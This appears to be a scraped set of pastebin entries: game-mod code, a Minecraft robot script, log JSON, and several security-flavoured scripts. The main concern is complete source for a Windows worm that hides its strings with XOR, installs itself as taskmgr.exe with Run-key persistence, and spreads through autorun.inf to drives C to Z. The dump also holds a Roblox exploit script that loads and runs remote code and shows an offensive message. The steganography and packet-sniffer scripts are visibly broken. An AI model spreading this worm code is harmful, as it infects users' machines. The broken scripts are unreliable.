				possibleValues = game.managers[6].meta[0].meta.map(arr => arr.name);
				
				break;

			case ""spaceBuilding"":
				possibleValues = game.managers[6].meta[1].meta.map(arr => arr.name);
				
				possibleValues = possibleValues.concat(game.managers[6].meta[2].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[3].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[4].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[5].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[6].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[7].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[8].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[9].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[10].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[11].meta.map(arr => arr.name));
				possibleValues = possibleValues.concat(game.managers[6].meta[12].meta.map(arr => arr.name));
				break;

			case ""chronoforge"":
				possibleValues = game.managers[7].meta[0].meta.map(arr => arr.name);
				break;
			case ""voidSpace"":
				possibleValues = game.managers[7].meta[1].meta.map(arr => arr.name);
				break;
			case ""zigguratUpgrades"":
				possibleValues = game.managers[5].meta[0].meta.map(arr => arr.name);
				break;
			case ""religion"":
				possibleValues = game.managers[5].meta[1].meta.map(arr => arr.name);
				break;
			case ""transcendenceUpgrades"":
				possibleValues = game.managers[5].meta[2].meta.map(arr => arr.name);
				
				break;
			case ""pacts"":
				possibleValues = game.managers[5].meta[3].meta.map(arr => arr.name);
			   
				break;
			case ""upgrades"":
				possibleValues = game.managers[0].meta[0].meta.map(arr => arr.name);
		   
				break;
			case ""zebraUpgrades"":
				possibleValues = game.managers[0].meta[1].meta.map(arr => arr.name);
				break;
		}
		
		if(possibleValues)
		{
			game.time.queue.queueSourcesArr[i].possibleValues = possibleValues;
		}
		else
		{
			console.error(""unknow item:"", game.time.queue.queueSourcesArr[i].name);
		}
	}
}

game.mods.sophie.nameToType = function (sName)
{
	for(var i=0 ;i<game.time.queue.queueSourcesArr.length; i++)
	{
		if(game.time.queue.queueSourcesArr[i].possibleValues.includes(sName))
		{
			return game.time.queue.queueSourcesArr[i].name;
		}
	}
	return false;
}


game.mods.sophie.smartBuild = function (sName, iValue = 1)
{
	var sType = game.mods.sophie.nameToType(sName);
	if(!sType)
	{
		console.error(""game.mods.sophie.smartBuild type from item not found in game.time.queue.queueSourcesArr[i].possibleValues"", sName);
	}
	else
	{
		game.mods.sophie.myBuild(sName, sType, iValue);
	}
}

game.mods.sophie.init = function ()
{
	if(!game.mods.sophie.myBuild)
	{	
		game.mods.sophie.genMyBuildFunction();
		game.mods.sophie.fillPossibleValues();
	}
}

game.mods.sophie.init();"
3a51H2Sf,MC:OC bushbot,copperTones,Lua,Friday 7th of July 2023 11:03:52 PM CDT,"-- bushbot.lua
--[[                                   -
Minecraft, Compact Claustrophobia
A robot that harvests and waters an area of crops.
-                                   ]]--
-- bushbot DEPTH WIDTH [-idle=30] [--itr=-1]
local shell = require(""shell"")
local robot = require(""component"").robot

local opt, args = shell.parse(...)
local depth, width = tonumber(opt[1]), tonumber(opt[2])
local idle, itr = tonumber(args.idle) or 30, tonumber(args.itr) or -1

while itr ~= 0 do
    robot.setLightColor(0x00ff00)
    robot.use(0)
    for i=1,width do
        for i=2,depth do
            robot.move(3)
            robot.use(0)
        end
        if i ~= width then
            local cw = i%2 == 0
            robot.turn(cw)
            robot.move(3)
            robot.use(0)
            robot.turn(cw)
        end
    end
    --move back to start line
    if width%2 == 1 then
        robot.turn(false)
        robot.turn(false)
        for i=2,depth do
            robot.move(3)
        end
    end
    robot.turn(false)
    for i=2,width do
        robot.move(3)
    end
    robot.turn(false)
    
    for i=0,15 do
        robot.setLightColor(0x111111*i)
        os.sleep(idle/16)
    end
    itr = math.max(itr-1, -1)
end"
Fu2GtxEr,Worm.Win32.Disposable - Hav0c - Rohitab,FlyFar,C,Friday 7th of July 2023 10:47:30 PM CDT,"/* disposable.c - coded by Hav0c
 
This l33t <span class=""searchlite"">worm</span> is the first one I've made
 
that uses encrypted strings to avoid being
 
too suspicious when opened with hex editors
 
or even windbl0wz notepad. Spreads by copying itself to drives
 
(from C to Z, without checking if they are removable or not).
 
Compiles with Dev-C++ (I run it with WINE).
 
 
 
PS: I hate skiddies
 
PPS: Blasted Mechanism FTW!!1
 
*/
 
 
 
#include <stdio.h>
 
#include <stdlib.h>
 
#include <string.h>
 
#include <windows.h>
 
 
 
 
char teh<span class=""searchlite"">worm</span>[]=""XXpewoicv*a|a""; // \\taskmgr.exe
 
char regkey[]=""WkbpsevaXXImgvkwkbpXXSmj`kswXXGqvvajpRavwmkjXXVqjXX""; // Software\\Microsoft\\Windows\\CurrentVersion\\Run\\
 
 
 
int decrypt(char string[], int key)
 
{
 
    int strsz=strlen(string);
 
    int i;
 
    for(i=0;i<strsz;i++){
 
        string[i] ^= key;
 
    }
 
    return string;
 
}
 
 
 
int CheckForMutex(char tehMutex[])
 
{
 
    HANDLE hMutex;
 
    hMutex=CreateMutex(NULL,1,tehMutex);
 
    if(GetLastError()==ERROR_ALREADY_EXISTS){
 
        ExitProcess(0);
 
    }
 
}
 
 
 
void RootKit(char file[]) // Not a real rootkit obviously, just hides some stuff
 
{
 
    SetFileAttributes(file,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_SYSTEM);
 
}
 
 
 
void MakeRegKey(char destiny[])
 
{
 
    HKEY hKey;
 
    char buffer[MAX_PATH];
 
    strcpy(buffer,decrypt(""pewoicv"",4)); // taskmgr
 
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,decrypt(regkey,4),0,KEY_SET_VALUE,&hKey)||
        RegOpenKeyEx(HKEY_CURRENT_USER,decrypt(regkey,4),0,KEY_SET_VALUE,&hKey)==ERROR_SUCCESS){
 
        RegSetValueEx(hKey,buffer,0,REG_SZ,(const unsigned char *)destiny,sizeof(destiny));
 
        RegCloseKey(hKey);
 
    }
 
    else{
 
        ExitProcess(0);
 
    }
 
}
 
 
 
void DriveSpread(char shizzle[])
 
{
 
    FILE *fp;
 
    int n;
 
    char buffer1[MAX_PATH],buffer2[MAX_PATH],buffer3[MAX_PATH];
 
    strcpy(buffer1,decrypt(""G>XXeqpkvqj*mjb"",4)); // C:\\autorun.inf
 
    strcpy(buffer2,decrypt(""G>XXLer4g*a|a"",4)); // C:\\Hav0c.exe
 
    strcpy(buffer3,decrypt(""_eqpkvqjYXvXjktaj9Ler4g*a|aXvXjWlahhA|agqpa9Ler4g*a|aXvXj"",4)); // [autorun]\r\nopen=Hav0c.exe\r\nShellExecute=Hav0c.exe\r\n
 
    for(n='C';n<='Z';n++){
 
        buffer1[0]=n;
 
        buffer2[0]=n;
 
        if(CopyFile(shizzle,buffer2,0)!=NULL){
 
            RootKit(buffer2);
 
        }
 
        if((fp=fopen(buffer1,writting))!=NULL){
 
            fprintf(fp,buffer3);
 
            fclose(fp);
 
            RootKit(buffer1);
 
        }
 
    }
 
}
 
 
 
int main()
 
{
 
    char sysdir[MAX_PATH];
 
    char <span class=""searchlite"">worm</span>[MAX_PATH];
 
    CheckForMutex(decrypt(""Ler4g[Ksj~[@mk"",4)); // find it out your self
 
    HMODULE GetModH=GetModuleHandle(NULL);
 
    GetModuleFileName(GetModH,<span class=""searchlite"">worm</span>,sizeof(<span class=""searchlite"">worm</span>));
 
    GetSystemDirectory(sysdir,sizeof(sysdir));
 
    strcat(sysdir,decrypt(teh<span class=""searchlite"">worm</span>,4));
 
    CopyFile(<span class=""searchlite"">worm</span>,sysdir,0);
 
    RootKit(sysdir);
 
    MakeRegKey(sysdir);
 
    while(1){
 
        DriveSpread(<span class=""searchlite"">worm</span>);
 
        //Payload here(function not included to avoid �b3r unl33t skiddiz <_<)
 
        Sleep(20000);
 
    }
 
    return 0;
 
}"
KiVubczH,Steganography - Python,FlyFar,Python,Friday 7th of July 2023 10:33:09 PM CDT,"from PIL import image
import binascii
import optparse

def rgb2hex(r,g,b):
	return '#{:02x}{:02x}{:02x}'.format(r,g,b)

def hex2rgb(hexcode):
	return tuple(map(ord,hexcode[1:],decode('hex')))

def str2bin(message):
	binary=bin(int(binascii.hexify(message),16))
	return binary[2:]

def binary2str(binary):
	message=binascii.unhexify('%x' % (int('0b'+binary,2)))
	return message

def encode(hexcode,digit):
	if hexcode[-1] in ('0','1','2','3','4','5'):
		hexcode=hexcode[:-1]+digit
		return hexcode
	else:
		return None

def decode(hexcode):
	if hexcode[-1] in ('0','1'):
		return hexcode[-1]
	else:
		None		

def hide(filename, message):
	img=Image.open(filename)
	binary=str2bin(message)+'1111111111111110'
	if img.mode in ('RGBA'):
		img=img.convert('RGBA')
		datas=image.getdata()
		newData=[]
		digit=0
		temp=''
		for item in datas:
			if (digit<len(binary)):
				newpix=encode(rgb2hex(item[0],item[1],item[2]),binayu[digit])
				if newpix==None:
					newData.append(item)
				else:
					r,g,b=hex2rgb(newpix)
					newData.append((r,g,b,255))
					digit+=1
			else:
				newData.append(item)
		img.putdata(newData)
		img.save(filename,""PNG"")
		return ""Completed!""
	return ""Incorrect Image Mode!!""

def retrieve(filename):
	img=Image.open(filename)
	binary=''

	if img.mode in ('RGBA'):
		img=img.convert('RGBA')
		datas=img.getdata()

		for item in datas:
			digit=decode(rgb2hex(item[0],item[1],item[2]))
			if digit==None:
				pass
			else:
				binary=binary+digit
				if(binary[-16:]==""1111111111111110""):
					print ""Success""
					return bin2str(binary[:-16])
		return bin2str(binary)
	return ""Incorrect Image Mode!!""

def Main():
	parser=optparse.OptionParser('Usage: %prog '+'-e/d <target file>')
	parser.add_option('-e',dest='hide',type=""string"",help=""target picture path to hide text"")
	parser.add_option('-d',dest='retrieve',type=""string"",help=""target picture path to retrieve text"")
	(options.args)=parser.parse.args()
	if (options.hide != None):
		text=raw_input('Enter message:')
		print hide(options.hide,text)
	elif (options.retreive != None):
		print retrieve(options.retrieve)
	else:
		print parser.usage
		exit(0)

if __name__==""__main__"":
	Main()"
KTD8Z9Np,Untitled,AndrewBucklin,JSON,Friday 7th of July 2023 10:32:47 PM CDT,"  {
    ""event"": ""Task started"",
    ""level"": ""info"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 2070,
    ""task_id"": ""6aca89ae-539c-498a-afa7-ec49ef318719"",
    ""task_name"": ""ldap_sync_single"",
    ""timestamp"": ""2023-07-08T03:11:30.355362""
  },
  {
    ""event"": ""Task failure"",
    ""exc"": ""AttributeError(\""'UUID' object has no attribute 'connection'\"")"",
    ""level"": ""warning"",
    ""logger"": ""authentik.root.celery"",
    ""pid"": 2070,
    ""task_id"": ""task-6aca89ae539c498aafa7ec49ef318719"",
    ""timestamp"": ""2023-07-08T03:11:30.600779""
  },
  {
    ""action"": ""system_exception"",
    ""client_ip"": null,
    ""context"": {
      ""message"": ""Traceback (most recent call last):\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 477, in trace_task\n    R = retval = fun(*args, **kwargs)\n                 ^^^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 275, in _inner\n    reraise(*exc_info)\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/_compat.py\"", line 60, in reraise\n    raise value\n  File \""/usr/local/lib/python3.11/site-packages/sentry_sdk/integrations/celery.py\"", line 270, in _inner\n    return f(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^\n  File \""/usr/local/lib/python3.11/site-packages/celery/app/trace.py\"", line 760, in __protected_call__\n    return self.run(*args, **kwargs)\n           ^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \""/authentik/sources/ldap/tasks.py\"", line 42, in ldap_sync_single\n    task = chain(\n            ^^^^^^\n  File \""/authentik/sources/ldap/tasks.py\"", line 55, in ldap_sync_paginator\n  File \""/authentik/sources/ldap/sync/base.py\"", line 29, in __init__\n    self._connection = source.connection()\n                       ^^^^^^^^^^^^^^^^^\nbuiltins.AttributeError: 'UUID' object has no attribute 'connection'""
    },
    ""event"": ""Created Event"",
    ""level"": ""info"",
    ""logger"": ""authentik.events.models"",
    ""pid"": 2070,
    ""timestamp"": ""2023-07-08T03:11:30.603336"",
    ""user"": {}
  }"
yj9ZxKpY,testJson,nonvpn,JSON,Friday 7th of July 2023 10:31:44 PM CDT,"{
   ""result"":[
      {
         ""name"":""aa_vip_01_ais"",
         ""online"":""1""
      },
      {
         ""name"":""aa_vip_01_dtac"",
         ""online"":""1""
      },
      {
         ""name"":""aa_vip_01_true"",
         ""online"":""1""
      },
      {
         ""name"":""aa_vip_05_ais"",
         ""online"":""05""
      },
      {
         ""name"":""aa_vip_05_dtac"",
         ""online"":""05""
      },
      {
         ""name"":""aa_vip_05_true"",
         ""online"":""05""
      }
   ]
}"
Kvz0QsX5,Ethernet Sniffer,FlyFar,Python,Friday 7th of July 2023 10:31:18 PM CDT,"import socket
import textwrap
import struct

TAB_1 = '\t - '
TAB_2 = '\t\t - '
TAB_3 = '\t\t\t - '
TAB_4 = '\t\t\t\t - '

DATA_TAB_1 = '\t   '
DATA_TAB_2 = '\t\t   '
DATA_TAB_3 = '\t\t\t   '
DATA_TAB_4 = '\t\t\t\t   '

def ether_frame(data):
	#unpack etherbet frame
	dest_mac,src_mac,protocol=struct.unpack('! 6s 6s 6s H',data[:14])
	return get_mac_address(dest_mac), get_mac_address(src_mac), socket.htons(protocol), data[14:]

def get_mac_address(bytes_addr):
	#Formats mac address in a proper format(AA:BB:CC:DD:EE:FF)
	bytes_strmap=map('{:02x}'.format, bytes_addr)
	mac_addr=':'.join(bytes_str).upper()
	return mac_addr

def main():
	connection=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
	while True:
		raw_data,addr=connection.recvfrom(65536)
		dest_mac, src_mac, eth_proto, data = ethernet_frame(raw_data)
		print('\nEthernet Frame:')
		print(TAB_1+'Destination: {}, Source: {}, Protocol: {}'.format(dest_mac,src_mac,eth_proto))

		if eth_proto==8:
			(version,header_length,ttl,proto,src,target,data)=ipv4_packet(data)
			print(TAB_1+'IPv4 Packet:')
			print(TAB_2 + 'Version: {}, Header Length: {}, TTL: {},'.format(version,header_length,ttl))
            print(TAB_2 + 'Protocol: {}, Source: {}, Target: {}'.format(proto, src, target))

		elif eth_proto==1:
			 icmp = ICMP(ipv4.data)
            print(TAB_1 + 'ICMP Packet:')
            print(TAB_2 + 'Type: {}, Code: {}, Checksum: {},'.format(icmp_type,code, checksum))
            print(TAB_2 + 'ICMP Data:')
            print(format_multi_line(DATA_TAB_3, data))

		elif eth_proto == 17:
            src_port,dest_port,length,data = udp_packet(data)
            print(TAB_1 + 'UDP Segment:')
            print(TAB_2 + 'Source Port: {}, Destination Port: {}, Length: {}'.format(src_port,dest_port, size))

		elif eth_proto==6:
			(src_port, dest_port,sequebce, acknowledgement, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data)=tcp_packet(data)
			print(TAB_1 + 'TCP Segment:')
            print(TAB_2 + 'Source Port: {}, Destination Port: {}'.format(src_port, dest_port))
            print(TAB_2 + 'Sequence: {}, Acknowledgment: {}'.format(sequence, acknowledgment))
            print(TAB_2 + 'Flags:')
            print(TAB_3 + 'URG: {}, ACK: {}, PSH: {}'.format(flag_urg, flag_ack, flag_psh))
            print(TAB_3 + 'RST: {}, SYN: {}, FIN:{}'.format(flag_rst, flag_syn, flag_fin))
			print(format_multi_line(DATA_TAB_3,data))

		else:
            print(TAB_1 + 'Other IPv4 Data:')
            print(format_multi_line(DATA_TAB_2, data))

def ipv4_packet(data):
	#unpack IP Packet
	version_header_length=data[0]
	version=version_header_length >> 4
	header_length = (version_header_length & 15) * 4
	ttl,protocol,src,dest=struct.unpack('! 8x B B 2x 4s 4s',data[:20])
	return version,header_length, ttl, protocol,ipv4(src),ipv4(dest),data[data_header:]

#Returns Formatted IPv4 Address
def ipv4(addr):
	return '.'.join(map(str,addr))

def icmp_packet(data):
	icmp_type,code,checksum=struct.unpack('! B B H', data[:4])
	return icmp_type,code,checksum,data[4:]

def tcp_packet(data):
	(src_port,dest_port,sequence,acknowledgement,offest_reserved_flags)=struct.unpack('! H H L L H',data[:14])
	offset=(offset_reserved_flags >> 12) * 4
	flag_urg=(offset_reserved_flags & 32)>> 5
	flag_ack=(offset_reserved_flags & 16)>> 4
	flag_psh=(offset_reserved_flags & 8)>>  3
	flag_rst=(offset_reserved_flags & 4)>>2
	flag_syn=(offset_reserved_flags & 2)>>1
	flag_fin=(offset_reserved_flags & 1)
	return src_port, dest_port,sequebce, acknowledgement, flag_urg, flag_ack, flag_psh, flag_rst, flag_syn, flag_fin, data[offset:]


def udp_packet(data):
	src_port, dest_port,size=struct.unpack('! H H 2x H',data[:8])
	return src_port,dest_port,size

def format_multi_line(prefix, string, size=80):
    size -= len(prefix)
    if isinstance(string, bytes):
        string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
        if size % 2:
            size -= 1
    return '\n'.join([prefix + line for line in textwrap.wrap(string, size)])


main()"
WUaHfMDN,lol,Synpase_X,Lua,Friday 7th of July 2023 09:32:21 PM CDT,"-- Hats

-- https://www.roblox.com/catalog/5268602207/Void-Lord-Sword
-- https://www.roblox.com/catalog/4773932088/Evil-Aura


--//====================================================\\--
--||	Void Duel by prostoRobot
--\\====================================================//--
game[""Run Service""].RenderStepped:connect(function()
	settings().Physics.AllowSleep = false
	setsimulationradius(math.huge*math.huge,math.huge*math.huge)
end)
loadstring(game:GetObjects(""rbxassetid://5698675958"")[1].Source)()

local s = Instance.new(""Sound"")

s.Name = ""Sound""
s.SoundId = ""https://web.roblox.com/asset/?id=221057812""
s.Volume = 1
s.Looped = false
s.archivable = false

s.Parent = game.Workspace

wait(1)

s:play()
game:GetService(""StarterGui""):SetCore(""SendNotification"", {
	Title = ""I like eat children"";
	Text = ""Script loaded."";
	Icon = ""rbxthumb://type=Asset&id=4360506542&w=150&h=150""})
Duration = 29;

Player=game:GetService(""Players"").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head
Humanoid=Character:FindFirstChildOfClass(""Humanoid"")
m=Instance.new('Model',Character)
m2=Instance.new('Model',Character)
effs=Instance.new('Model',Character)
LeftArm=Character[""Left Arm""] 
LeftLeg=Character[""Left Leg""] 
RightArm=Character[""Right Arm""] 
RightLeg=Character[""Right Leg""] 
LS=Torso[""Left Shoulder""] 
LH=Torso[""Left Hip""] 
RS=Torso[""Right Shoulder""] 
RH=Torso[""Right Hip""] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=.2
attackmode='none'
local idle=0
local Anim=""Idle""
local Effects={}
local gun=false
local shoot=false
player=nil 
mana=0
local CurrentMode = ""Unsheathed""

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new(""Weld""), Instance.new(""Weld"") 
RW.Name=""Right Shoulder"" LW.Name=""Left Shoulder""
LH=Torso[""Left Hip""]
RH=Torso[""Right Hip""]
TorsoColor=Torso.BrickColor
function NoOutline(Part)
	Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso[""Right Shoulder""] 
LSH=ch.Torso[""Left Shoulder""] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name=""Right Shoulder""
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch[""Right Arm""] 
RW.Parent=ch.Torso 
-- 
LW.Name=""Left Shoulder""
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch[""Left Arm""] 
LW.Parent=ch.Torso 

local function weldBetween(a, b)
	local weldd = Instance.new(""ManualWeld"")
	weldd.Part0 = a
	weldd.Part1 = b
	weldd.C0 = CFrame.new()
	weldd.C1 = b.CFrame:inverse() * a.CFrame
	weldd.Parent = a
	return weldd
end

function nooutline(part)
	part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
end

function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it(""Part"")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end

ArtificialHB = Instance.new(""BindableEvent"", script)
ArtificialHB.Name = ""Heartbeat""
script:WaitForChild(""Heartbeat"")
frame = 0.015
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.Heartbeat:Fire()
game:GetService(""RunService"").Heartbeat:connect(function(s, p)
	tf = tf + s
	if tf >= frame then
		if allowframeloss then
			script.Heartbeat:Fire()
			lastframe = tick()
		else
			for i = 1, math.floor(tf / frame) do
				script.Heartbeat:Fire()
			end
			lastframe = tick()
		end
		if tossremainder then
			tf = 0
		else
			tf = tf - frame * math.floor(tf / frame)
		end
	end
end)
function swait(num)
	if num == 0 or num == nil then
		ArtificialHB.Event:wait(0)
	else
		for i = 0, num do
			ArtificialHB.Event:wait(0)
		end
	end
end

--        function swait(num)
--    if num==0 or num==nil then
--    game:service'RunService'.Heartbeat:wait(0)
--    else
--    for i=0,num do
--    game:service'RunService'.Heartbeat:wait(0)
--    end
--    end
--    end

function mesh(Mesh,part,meshtype,meshid,offset,scale)
	local mesh=it(Mesh)
	mesh.Parent=part
	if Mesh==""SpecialMesh"" then
		mesh.MeshType=meshtype
		mesh.MeshId=meshid
	end
	mesh.Offset=offset
	mesh.Scale=scale
	return mesh
end

function weld(parent,part0,part1,c0,c1)
	local weld=it(""Weld"")
	weld.Parent=parent
	weld.Part0=part0
	weld.Part1=part1
	weld.C0=c0
	weld.C1=c1
	return weld
end


local function CFrameFromTopBack(at, top, back)
	local right = top:Cross(back)
	return CFrame.new(at.x, at.y, at.z,
		right.x, top.x, back.x,
		right.y, top.y, back.y,
		right.z, top.z, back.z)
end

function Triangle(a, b, c)
	local edg1 = (c-a):Dot((b-a).unit)
	local edg2 = (a-b):Dot((c-b).unit)
	local edg3 = (b-c):Dot((a-c).unit)
	if edg1 <= (b-a).magnitude and edg1 >= 0 then
		a, b, c = a, b, c
	elseif edg2 <= (c-b).magnitude and edg2 >= 0 then
		a, b, c = b, c, a
	elseif edg3 <= (a-c).magnitude and edg3 >= 0 then
		a, b, c = c, a, b
	else
		assert(false, ""unreachable"")
	end
	
	local len1 = (c-a):Dot((b-a).unit)
	local len2 = (b-a).magnitude - len1
	local width = (a + (b-a).unit*len1 - c).magnitude
	
	local maincf = CFrameFromTopBack(a, (b-a):Cross(c-b).unit, -(b-a).unit)
	
	local list = {}
	
	if len1 > 0.01 then
		local w1 = Instance.new('WedgePart', m)
		game:GetService(""Debris""):AddItem(w1,5)
		w1.Material = ""SmoothPlastic""
		w1.FormFactor = 'Custom'
		w1.BrickColor = BrickColor.new(""White"")
		w1.Transparency = 0
		w1.Reflectance = 0
		w1.Material = ""Neon""
		w1.CanCollide = false
		NoOutline(w1)
		local sz = Vector3.new(0.2, width, len1)
		w1.Size = sz
		local sp = Instance.new(""SpecialMesh"",w1)
		sp.MeshType = ""Wedge""
		sp.Scale = Vector3.new(0,1,1) * sz/w1.Size
		w1:BreakJoints()
		w1.Anchored = true
		w1.Parent = workspace
		w1.Transparency = 0.3
		table.insert(Effects,{w1,""Disappear"",.03})
		w1.CFrame = maincf*CFrame.Angles(math.pi,0,math.pi/2)*CFrame.new(0,width/2,len1/2)
		table.insert(list,w1)
	end
	if len2 > 0.01 then
		local w2 = Instance.new('WedgePart', m)
		game:GetService(""Debris""):AddItem(w2,5)
		w2.Material = ""SmoothPlastic""
		w2.FormFactor = 'Custom'
		w2.BrickColor = BrickColor.new(""White"")
		w2.Transparency = 0
		w2.Reflectance = 0
		w2.Material = ""Neon""
		w2.CanCollide = false
		NoOutline(w2)
		local sz = Vector3.new(0.2, width, len2)
		w2.Size = sz
		local sp = Instance.new(""SpecialMesh"",w2)
		sp.MeshType = ""Wedge""
		sp.Scale = Vector3.new(0,1,1) * sz/w2.Size
		w2:BreakJoints()
		w2.Anchored = true
		w2.Parent = workspace
		w2.Transparency = 0.3
		table.insert(Effects,{w2,""Disappear"",.03})
		w2.CFrame = maincf*CFrame.Angles(math.pi,math.pi,-math.pi/2)*CFrame.new(0,width/2,-len1 - len2/2)
		table.insert(list,w2)
	end
	return unpack(list)
end


so = function(id,par,vol,pit) 
	coroutine.resume(coroutine.create(function()
		local sou = Instance.new(""Sound"",par or workspace)
		sou.Volume=vol
		sou.Pitch=pit or 1
		sou.SoundId=id
		swait() 
		sou:play() 
		game:GetService(""Debris""):AddItem(sou,6)
	end))
end

function clerp(a,b,t) 
	local qa = {QuaternionFromCFrame(a)}
	local qb = {QuaternionFromCFrame(b)} 
	local ax, ay, az = a.x, a.y, a.z 
	local bx, by, bz = b.x, b.y, b.z
	local _t = 1-t
	return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 

function QuaternionFromCFrame(cf) 
	local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
	local trace = m00 + m11 + m22 
	if trace > 0 then 
		local s = math.sqrt(1 + trace) 
		local recip = 0.5/s 
		return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
	else 
		local i = 0 
		if m11 > m00 then
			i = 1
		end
		if m22 > (i == 0 and m00 or m11) then 
			i = 2 
		end 
		if i == 0 then 
			local s = math.sqrt(m00-m11-m22+1) 
			local recip = 0.5/s 
			return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
		elseif i == 1 then 
			local s = math.sqrt(m11-m22-m00+1) 
			local recip = 0.5/s 
			return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
		elseif i == 2 then 
			local s = math.sqrt(m22-m00-m11+1) 
			local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
		end 
	end 
end

function QuaternionToCFrame(px, py, pz, x, y, z, w) 
	local xs, ys, zs = x + x, y + y, z + z 
	local wx, wy, wz = w*xs, w*ys, w*zs 
	local xx = x*xs 
	local xy = x*ys 
	local xz = x*zs 
	local yy = y*ys 
	local yz = y*zs 
	local zz = z*zs 
	return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end

function QuaternionSlerp(a, b, t) 
	local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
	local startInterp, finishInterp; 
	if cosTheta >= 0.0001 then 
		if (1 - cosTheta) > 0.0001 then 
			local theta = math.acos(cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((1-t)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta  
		else 
			startInterp = 1-t 
			finishInterp = t 
		end 
	else 
		if (1+cosTheta) > 0.0001 then 
			local theta = math.acos(-cosTheta) 
			local invSinTheta = 1/math.sin(theta) 
			startInterp = math.sin((t-1)*theta)*invSinTheta 
			finishInterp = math.sin(t*theta)*invSinTheta 
		else 
			startInterp = t-1 
			finishInterp = t 
		end 
	end 
	return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
	return game:service(""Workspace""):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

Damagefunc=function(Part,hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
	if hit.Parent==nil then
		return
	end
	local h=hit.Parent:FindFirstChildOfClass(""Humanoid"")
	for _,v in pairs(hit.Parent:GetDescendants()) do
		if v:IsA(""Humanoid"") then
			h=v
		end
	end
	if hit.Parent.Parent:FindFirstChild(""Head"")~=nil then
		h=hit.Parent.Parent:FindFirstChildOfClass(""Humanoid"")
	end
